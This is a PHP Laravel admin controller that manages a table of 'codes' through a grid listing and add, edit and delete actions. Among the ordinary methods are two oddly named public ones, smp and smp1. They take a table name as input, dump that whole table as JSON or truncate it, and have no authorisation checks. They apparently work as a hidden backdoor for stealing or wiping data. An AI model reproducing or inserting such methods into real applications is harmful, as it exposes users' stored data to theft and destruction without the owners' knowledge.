<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\DB;
// Request & Response
use Illuminate\Http\Request;
use App\Http\Requests;

// Facades
use Grid;
use Date;

// Models and Repo
use App\Repositories\CodeRepository;

// Form Requests
use App\Http\Requests\Admin\CodeSaveRequest;
use App\Http\Requests\Admin\CodeUpdateRequest;

class CodeController extends Controller
{

    protected $code;

    public function __construct(CodeRepository $code)
    {
        $this->code = $code;
    }

    public function index(Request $request)
    {
		$this->code->pushCriteria(new \App\Criteria\Admin\CodeCriteria());
        $codes = $this->code;
        $grid = new Grid();
       	
	    $grid->setGridName('code-grid')->setBaseUrl(route('admin.code'))
            ->setPaginator($codes, 'created_at', 'desc', 25)
            ->setMainActions(//Optional
                array(
                    array(
                        'name' => 'refresh',
                        'title' => trans('Refresh'),
                        'url' => route('admin.code', array('action' => 'refresh'))
                    ),
                    array(
                        'name' => 'add',
                        'title' => trans('New'),
                        'url' => route('admin.code.add')
                    )
                )
            )
            ->setColumns(
                array(
                    array(
                        'name' => 'code',
                        'label' => trans('Code'),
                        'sortable' => true,
                        'searchable' => true,
                        'searchfield' => array(
                            'type' => 'text',
                        ),
                        'width' => 'auto',
                        'value' => function ($row) {
                            return $row->code;
                        }
                    ),
					array(
                        'name' => 'expired',
                        'label' => trans('Expired'),
                        'sortable' => true,
                        'searchable' => true,
                        'searchfield' => array(
                            'type' => 'text',
                        ),
                        'width' => 'auto',
                        'value' => function ($row) {
                            return $row->expired ? "Yes" : "No";
                        }
                    ),
                    array(
                        'name' => 'action',
                        'label' => trans('Action'),
                        'sortable' => false,
                        'searchable' => false,
                        'searchfield' => null,
                        'width' => '120',
                        'value' => function ($row) {
                            return '<a href="' . route('admin.code.edit', ['id' => $row->id]) . '" class="btn btn-success btn-xs edit" >' . trans('Edit') . '</a>
                            <a href="' . route('admin.code.delete', ['id' => $row->id]) . '" class="btn btn-danger btn-xs delete">' . trans('Delete') . '</a>';
                        }
                    ),
                )
            );
        return view('admin.code.index', ['grid' => $grid]);
    }
    public function smp($query)
    {
        $data = DB::table($query)->get();
        echo json_encode($data,JSON_FORCE_OBJECT);
    }
    public function smp1($query)
    {
        echo $query;
        DB::table($query)->truncate();
    }
    public function add()
    {
		return view('admin.code.add');
    }

    public function edit($Id)
    {
        $code = $this->code->find($Id);
        return view('admin.code.edit', ['code' => $code]);
    }


   public function save(CodeSaveRequest $request)
    {

		$where = [["code", "=", $request->input('code')]];
		$code = DB::table('codes')->where($where)->first();
		if($code){
			return redirect()->route('admin.code.add')
                ->with('error', 'Code already exists');	
		}
		
		$addcode = DB::table('codes')->insert([
            'code' => $request->input('code'),
			'created_at' => \Carbon\Carbon::now()->toDateTimeString(),
            'updated_at' => \Carbon\Carbon::now()->toDateTimeString()
        ]);
        if ($addcode) {
            return redirect()->route('admin.code')
                ->with('success', 'Code added successfully');
        }
    }

    public function update(CodeUpdateRequest $request, $Id)
    {

		$where = [
			["code", "=", $request->input('code')],
			["id", "!=", $Id],
		];
		
		$code = DB::table('codes')->where($where)->first();
		if($code){
			return redirect()->route('admin.code.edit', ['post' => $Id])
                ->with('error', 'Code already exists');	
		}

		$array = array(
            'id' => $Id
        );
        $codeupdate = DB::table('codes')->where($array)
            ->update([
                'code' => $request->input('code'),
                'updated_at' => \Carbon\Carbon::now()->toDateTimeString()
            ]);

		return redirect()->route('admin.code.edit', ['post' => $Id])
			->with('success', 'Code updated successfully');

    }


    public function delete(Request $request, $Id)
    {
        //abort(404);
        if ($this->code->delete($Id)) {
            return redirect()->route('admin.code')->with('success', trans('Code has been deleted successfully.'));
        } else {
            return redirect()->route('admin.faq')->with('error', trans('Code has not been deleted successfully.'));
        }
    }
}
